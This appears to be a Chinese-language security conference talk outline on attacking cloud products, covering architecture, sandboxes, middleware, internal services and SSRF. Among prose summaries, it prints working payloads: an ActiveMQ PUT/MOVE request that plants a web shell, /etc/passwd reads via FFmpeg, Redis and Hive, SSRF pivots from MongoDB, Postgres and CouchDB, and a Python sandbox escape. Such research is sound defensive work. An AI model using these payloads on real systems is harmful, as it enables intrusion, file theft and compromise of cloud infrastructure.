# 云产品安全攻防技术解析

## Hacking Cloud Product
**[ Demon@n0tr00t ]**  
探索一切、攻破一切  
**[ Hacker@KCon ]**

### 关于我
- 在阿里云-云平台安全团队工作
- n0tr00t 团队成员（http://www.n0tr00t.com/）
- ID: Demon (微博：Demon写Demo)
- 跨界领域：摇滚乐、编程、安全

## 第一部分：分类和架构

### 1. 云的基础架构
- **种类繁多**：基础服务大同小异，每家云厂商还有自己的特色云服务。
- **资源开放**：按需付费、资源开放。从安全角度来看，这意味着更多的可控点，但同时也增加了防护难度。
- **木桶原理**：在云计算环境中，最弱的一环往往决定了整个系统的安全性。

### 2. 云产品的通用架构
- **网关系统**
- **用户管理**
- **Portal**
- **逻辑服务**
- **监控系统**
- **控制器**
- **计费系统**
- **调度系统**
- **资源管理**
- **Server**
- **运维管控**
- **API**
- **生产系统**
- **运维管理**
- **存储系统**
- **容灾系统**
- **实例**
- **底层云组件**
  - **虚拟机**
  - **物理集群**

### 3. 云产品的安全基石 - 沙箱（SandBox）
- **沙箱结构**：决定了产品的持久稳固性。
- **用户权限层**：
  - **脚本层**：如禁用的JavaScript或PHP函数。
  - **容器层**：Docker、Linux namespace、cgroup。
  - **用户权限隔离**：遵循最小权限原则，避免使用root权限，利用Linux capability机制。

## 第二部分：隐匿在结界内的隐患

### 1. 结界的划分
- **结界内**：
  - **业务逻辑服务**：负责业务逻辑处理。
  - **控制台（Portal）**：用户可管理产品。
  - **调度服务**：负责调配资源，控制链路。
  - **API服务**：通过API访问操作实例方便自动化。
  - **生产系统**：负责生产实例或释放实例等。
  - **管控系统**：用于管理或监控实例。
  - **其他**：因架构而定，如日志组件、任务下发模块等。
- **结界外**：
  - **未知模块**：如一些额外的存储系统。
  - **游离在架构之外的服务**：结界不明，难以发现。

### 2. 过度松耦合导致的隐患
- **十人传话游戏**：多层模块分离，安全职责不明确。

### 3. 攻击中间件服务
- **开源消息中间件**：Kafka、ActiveMQ、RabbitMQ、OpenJMS等。
- **分布式服务框架**：Dubbo、zookeeper、TAF等。
- **攻击方式**：
  - **Load eval Mbean via “getMBeansFromURL”**（http://www.n0tr00t.com/2015/04/16/JMX-RMI-Exploit.html）
  - **Java反序列化漏洞**（http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/）
  - **XML实体注入、命令注入、未授权调用服务**

### 4. 使用Java Message Exploitation Tool (JMET)
- **支持的中间件**：
  - Apache ActiveMQ
  - Redhat/Apache HornetQ
  - Oracle OpenMQ
  - IBM WebSphereMQ
  - Pivotal RabbitMQ
  - IIT Software SwiftMQ
  - Apache ActiveMQ Artemis
  - Apache QPID JMS
  - Apache QPID Client
- **项目地址**：https://github.com/matthiaskaiser/jmet
- **使用方法**：
  ```
  java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y xterm 127.0.0.1 61616
  ```

### 5. ActiveMQ CVE-2016-3088
- **请求示例**：
  ```
  PUT /fileserver/shell.txt HTTP/1.1
  Host: x.x.x.x
  Content-Length: 16

  MOVE /fileserver/shell.txt HTTP/1.1
  Destination: file:///usr/local/apache-activemq-5.7.0/webapps/shell.jsp
  Host: x.x.x.x
  ```

### 6. 运维管控系统
- **功能**：
  - 管理控制实例
  - 部署发布系统
  - 状态监控系统
  - 统一配置管理系统
- **安全隐患**：
  - ACL绕过、API未授权调用
  - 通过XSS漏洞打入到管控系统执行任务
  - 开源的管控系统的漏洞（如Hue、Splunk、Cacti、Jenkins、Zabbix、Zenoss、Elasticsearch）

### 7. 使用hiveSQL读取文件
- **示例**：
  ```sql
  SELECT * FROM `hive` WHERE path = '/etc/passwd';
  ```

### 8. 内部服务未授权问题
- **常见问题**：
  - Redis未授权访问
  - MongoDB未授权访问
  - Rsync未授权访问
  - Memcache未授权访问

## 第三部分：以点破面 - Hacking

### 1. 云服务
- **开源服务**
- **自研服务**

### 2. 开源服务的脆弱点
- **已知安全问题**：如FFmpeg SSRF & 任意文件读取、ImageMagick RCE等。
- **配置与权限设置不严格**：可能导致沙箱绕过。
- **网络边界和部署问题**：如MSSQL、MongoDB、Postgres、CouchDB等的SSRF漏洞。

### 3. 案例
- **FFmpeg**：
  ```m3u8
  #EXTM3U
  #EXT-X-MEDIA-SEQUENCE:0
  #EXTINF:10.0,
  concat:http://xxx/test.m3u8|file:///etc/passwd
  #EXT-X-ENDLIST
  ```
- **Redis**：
  ```redis
  EVAL "return dofile('/etc/passwd')" 0
  ```
- **MongoDB**：
  ```mongo
  db.copyDatabase("\nstats\nquit", 'test', 'localhost:11211')
  ```
- **Postgres**：
  ```sql
  SELECT dblink_send_query('host=127.0.0.1 dbname=quit user=\'\nstats\n\' password=1 port=11211 sslmode=disable', 'select version();');
  ```
- **CouchDB**：
  ```json
  POST http://couchdb:5984/_replicate
  Content-Type: application/json
  Accept: application/json

  {
    "source": "recipes",
    "target": "http://secretdb:11211/recipes"
  }
  ```

### 4. 自研服务
- **引用《三体II 黑暗森林》**：
  > “宇宙就是一座黑暗森林，每个文明都是带枪的猎人，像幽灵般潜行于林间，任何暴露自己坐标的生物都将很快被消灭。”
  - **宇宙 = 网络**
  - **文明 = 系统(服务)**

### 5. 隐匿在云环境下的脆弱目标
- **服务器集群**：
  - server1, server2, server3, ..., serverN

### 6. 攻击方式
- **从进程、网络流量、端口中找寻agent的相关信息**
- **定位agent的坐标**
- **对agent实施安全测试**
- **对agent坐标同网络段下的系统进行测试**

### 7. 案例
- **某云厂商RPC组件任意代码执行**

### 8. 产品本身
- **利用产品本身功能收集内网IP坐标信息**：
  - 负载均衡的健康检查机器
  - 云安全扫描
  - 云监控的请求日志
  - 浏览器测试类产品的请求日志
- **借用实例网络环境访问内部组件**：
  - 回源功能（CDN、云WAF）
  - 域名解析+组合服务
  - 网络代理、回调
  - 消息推送

### 9. 文件处理属性相关产品
- **文件读取、解压软链接文件**
- **命令执行、沙箱绕过**
- **SSRF**
- **Python沙箱绕过**：
  ```python
  >>> [].__class__.__base__.__subclasses__()[58].__init__.func_globals['linecache'].__dict__.values()[14]
  ```

### 10. 目标禁止外连怎么办？
- **服务器A禁止外连**：
  - 其他云产品实例（如RDS、Redis、App Engine等）通过私网环境向实例透出数据。
  - 攻击者连接实例读取数据，进行命令执行、文件读取。

### 11. 在内部能做什么
- **流量监控**
- **控制集群**
- **寻找特权AK**
- **批量生成实例**

### 总结：如何进行黑客攻击
- **阅读公开文档、架构文档、操作手册**，了解产品功能和架构模块。
- **研究实例的网络环境与组件间调用关系**。
- **寻找组件中可能使用的开源组件列表**。
- **结合功能和支持的协议分析风险点**。
- **大量测试，找出漏洞**。

**THANKS**  
**[ Demon@KCon ]**